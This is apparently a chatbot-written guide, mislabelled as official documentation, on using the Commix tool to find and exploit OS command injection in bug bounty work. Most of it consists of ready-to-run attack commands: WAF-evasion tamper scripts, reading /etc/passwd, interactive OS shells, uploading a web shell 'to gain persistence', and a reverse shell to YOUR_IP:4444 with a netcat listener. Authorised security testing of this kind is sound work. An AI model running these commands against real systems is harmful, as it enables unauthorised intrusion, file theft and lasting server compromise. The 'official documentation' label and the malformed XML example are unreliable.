# Commix-official-documentation
Alright, let's get you up to speed with using **Commix** for bug bounty. It's an automated tool that's fantastic for finding and exploiting OS command injection vulnerabilities. Think of it as `sqlmap`, but for command injection.

Here is a practical guide packed with examples relevant to a bug bounty workflow.

### 🛠️ The Core Commands You'll Use Most

Before diving into complex scenarios, here is a quick reference for the most common commands you will use. I've compiled this from the official documentation and various guides .

| Command | Purpose | Bug Bounty Use Case |
| :--- | :--- | :--- |
| `--url` or `-u` | Target URL (mark injection point with `*`)  | Testing a GET parameter. |
| `--data` | Data string for POST requests  | Testing form inputs or APIs that use POST. |
| `-r` | Load a raw HTTP request from a file (e.g., from Burp Suite)  | Quickly test a request you've already captured. |
| `--level` | Set test depth (1-3, default is 1)  | Increase to 3 to test HTTP headers like `User-Agent` and `Referer`. |
| `--cookie` | Set a Cookie header  | Test authenticated endpoints. |
| `--os-cmd` | Execute a single OS command  | Quickly confirm a vulnerability by running a command like `whoami`. |
| `--os-shell` | Get an interactive pseudo-terminal shell  | Deepen the impact after confirming a vulnerability. |
| `--tamper` | Use scripts to evade WAFs/filters  | Bypass input sanitization. |
| `--technique` | Force a specific injection technique  | Use `--technique=timebased` for blind injections. |
| `--batch` | Run in non-interactive mode, using defaults  | Automate your scans. |
| `--file-read` | Read a file from the target server  | Extract sensitive files like `/etc/passwd` or configuration files. |

---

### 💡 Bug Bounty-Focused Examples

Here are some practical scenarios you will likely encounter.

#### 1. Testing the Basics: GET and POST Parameters

This is your starting point for any parameter that looks like it might be passed to a system command, such as a `ping` or `traceroute` endpoint.

*   **Testing a GET parameter:**
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1"
    ```
    Commix will automatically test the `ip` parameter for vulnerabilities .

*   **Testing a POST parameter:**
    ```bash
    commix --url="http://target.com/submit.php" --data="host=127.0.0.1&test=abc"
    ```
    This tells Commix to test the POST body for injection points .

#### 2. Speed Up Your Testing with `--batch`

Bug bounty is a game of efficiency. The `--batch` flag tells Commix to run with default answers, so you don't have to babysit the tool .

```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --batch
```

#### 3. Increasing `--level` to Test Headers

By default, Commix only tests URL parameters. To test HTTP headers like `User-Agent`, `Referer`, or `Host` for injection, you need to set `--level=3` . This is a common source of high-impact findings.

```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --level=3
```
[According to the official wiki], at level 3, the `User-Agent` and `Referer` headers are also tested. The `Host` header is also included .

#### 4. From Burp Suite Request to Exploitation

You will often find an interesting request in Burp Suite. You can save that request to a file and feed it directly to Commix .

*   **Save the request:** In Burp, right-click on the request and select "Copy to file".
*   **Run Commix:**
    ```bash
    commix -r request.txt --batch
    ```
    This is a very fast way to start testing.

#### 5. Using `--tamper` to Bypass WAFs and Filters

Many applications will try to block command injection by filtering out dangerous characters. Commix has `--tamper` scripts to bypass these filters, similar to `sqlmap` .

*   **Scenario: Filtering spaces.** If the application removes spaces, use the `space2ifs` tamper script, which replaces spaces with `${IFS}` (Internal Field Separator), a valid shell alternative .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --tamper=space2ifs
    ```
*   **Scenario: Blacklisting keywords.** The `uninitializedvariable` tamper can help bypass keyword filters (like blocking `whoami`) by adding uninitialized variables, e.g., `w${AB}hoami` .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --tamper=uninitializedvariable
    ```

#### 6. Confirming and Exploiting: `--os-cmd` and `--os-shell`

Once Commix identifies a potential vulnerability, you need to prove impact.

*   **Execute a single command:** Use `--os-cmd` to run one command. This is great for proof-of-concept .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --os-cmd="whoami"
    ```
*   **Get an interactive shell:** For full access, use `--os-shell`. This will give you a pseudo-terminal on the target .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --os-shell
    ```

#### 7. Extracting Data: `--file-read`

A critical part of a report is showing what you can access. Use `--file-read` to download sensitive files .

```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --file-read="/etc/passwd"
```

This command will attempt to read the `/etc/passwd` file and display its contents.

### 🎯 Where to Look for Command Injection

Knowing where to look will save you a lot of time. These are common patterns from real-world scenarios :

*   **Ping and traceroute endpoints:** `/ping.php?ip=...`, `/tracert?host=...`
*   **Debug or admin endpoints:** `/exec.php?cmd=...`, `/admin/execute.php`
*   **Log viewers:** That use `tail -f` or `grep` on user input.
*   **Backup/Restore functions:** That use `tar`, `zip`, or `unzip` with user-controlled filenames.
*   **Any function that interacts with the OS:** Like sending emails, converting files, or generating reports.
  Here are some more advanced core examples for taking your Commix usage to the next level in a bug bounty context, particularly focusing on precision and bypass techniques.

### 🎯 Advanced Targeting and Precision

These flags help you test specific parameters or control how Commix conducts the test.

#### 1. The `-p` Flag: Target a Specific Parameter

Instead of letting Commix test all parameters, you can pinpoint exactly which one to inject into using the `-p` flag. This is much faster and reduces noise.
```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1&debug=0" -p ip
```
This tells Commix to only test the `ip` parameter for command injection.

#### 2. The `--technique` Flag: Control the Test

By default, Commix tests all four injection techniques (classic, eval-based, time-based, file-based) . Use `--technique` to focus on a specific one. This is useful for blind injection scenarios where you can only reliably detect a time delay.
```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --technique=time
```
You can also use `--skip-technique` to exclude a method .

#### 3. Verbose Mode (`-v`): See the Details

When a test isn't behaving as expected, increasing the verbosity helps you understand what Commix is doing.
*   `-v 1`: Shows simple debugging info.
*   `-v 2`: Shows all HTTP requests being sent .
*   `-v 3`: Shows HTTP request and response headers .
*   `-v 4`: Shows the full request and response bodies, useful for deep debugging .

```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" -v 2
```
This is invaluable for crafting custom bypasses.

### 🛡️ WAF Bypass and Payload Obfuscation

This is where Commix shines. You can use tamper scripts to defeat input filters.

#### 1. Listing Available Tamper Scripts

To see what's available:
```bash
ls $(python3 -c "import commix; print(commix.__path__[0])")/tamper/ 2>/dev/null
```
For a git clone, the path would be `commix/src/tamper/` .

#### 2. Chaining Tamper Scripts

To evade complex filters, you can chain multiple tamper scripts. Commix will apply them in order.
```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --tamper="space2ifs,uninitializedvariable"
```
This will first replace spaces with `${IFS}` and then add uninitialized variables to keywords like `whoami` (e.g., `w${AB}hoami`), bypassing both space and keyword filters .

#### 3. Other Useful Tamper Scripts

*   `backslashes`: Adds backslashes before each character in the payload (e.g., `whoami` -> `w\h\o\a\m\i`) .
*   `hexencode`: Hex-encodes the entire payload .
*   `base64encode`: Base64-encodes the payload .
*   `rev.py`: Reverses the command character-wise (e.g., `whoami` -> `imaohw`) .

#### 4. Testing HTTP Headers, Cookies, JSON, and XML

Commix isn't limited to URL parameters or standard POST data. It can test many different contexts.

*   **Testing a Cookie:** 
    ```bash
    commix -u "http://target.com/index.php" --cookie="session=INJECT_HERE"
    ```

*   **Testing a JSON Body:** 
    ```bash
    commix -u "http://target.com/api" --data='{"cmd":"ping"}' -p cmd
    ```

*   **Testing an XML Body:** 
    ```bash
    commix -u "http://target.com/api" --data='<?xml><cmd>ping</cmd></xml>'
    ```

*   **Testing a Custom Header:** 
    ```bash
    commix -u "http://target.com/index.php?id=1" --headers="X-User: INJECT_HERE"
    ```

### 📂 File System Interaction and Exploitation

After confirming a vulnerability, you can read, write, or get a reverse shell.

#### 1. Writing a File to the Server

This is an excellent way to gain a persistent foothold by uploading a web shell.
First, create a local file (e.g., `webshell.php`), then use `--file-write` and `--file-dest` .
```bash
commix -r req.txt --batch --file-write=webshell.php --file-dest=/var/www/html/webshell.php
```

#### 2. Getting a Reverse Shell

If `--os-shell` isn't working perfectly or you want a more stable interactive shell, you can use the reverse TCP option .
```bash
commix --url="http://target.com/page?id=1" --reverse-tcp="YOUR_IP:4444"
```
Make sure you have a netcat listener running on your machine first (`nc -lvnp 4444`).

### 💡 Bug Bounty Workflow

1.  **Initial Recon:** Identify interesting parameters (especially in `ping`, `trace`, `exec`, `backup`, `mail`, `convert` functions).
2.  **Quick Scan:** Use `--batch` for a quick first pass.
3.  **Head-Hunting:** If you suspect a specific header or cookie is vulnerable, test it directly using `--cookie` or `--headers`.
4.  **Evade Filters:** If you get a detection, start chaining tamper scripts (`--tamper`). Many bug bounty reports start with a basic injection and escalate to a shell using tamper scripts .
5.  **Prove Impact:**
    *   **Low:** `--os-cmd="whoami"` .
    *   **Medium:** `--file-read="/etc/passwd"` .
    *   **High:** `--os-shell` or `--reverse-tcp` to get interactive access .
    *   **Critical:** `--file-write` to upload a web shell and gain persistence .

Good luck with your bug bounty hunting! Let me know if you run into a specific filter or scenario you need help with.
